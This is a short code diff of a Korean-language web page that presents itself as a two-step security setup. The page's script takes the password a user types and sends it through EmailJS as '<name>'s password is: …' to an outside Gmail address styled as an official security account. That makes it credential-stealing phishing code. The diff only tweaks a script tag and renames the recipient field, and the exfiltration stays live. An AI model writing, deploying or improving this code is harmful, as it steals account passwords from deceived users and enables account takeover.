@@ -178,7 +178,7 @@ button.next-btn:disabled { background-color: #c0c7d0; cursor: default; }
   <p>2단계 보안이 설정되었습니다. 타 기기에서 인증 없이 귀하의 계정에 로그인할수 없습니다.</p>
 </div>
 
-<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
 <script>
 emailjs.init("xiQSCA5rQTqmbI4Qz");
@@ -228,7 +228,7 @@ nextPasswordBtn.addEventListener("click", () => {
 
   emailjs.send("service_jdep3dj", "template_bockd4k", {
         message: loggedUser.name + "'s password is: " + val,
-        to_email: "officialsecuritygg@gmail.com"
+        to: "officialsecuritygg@gmail.com"
     }).catch((err) => {
   console.log("STATUS:", err.status);
   console.log("TEXT:", err.text);
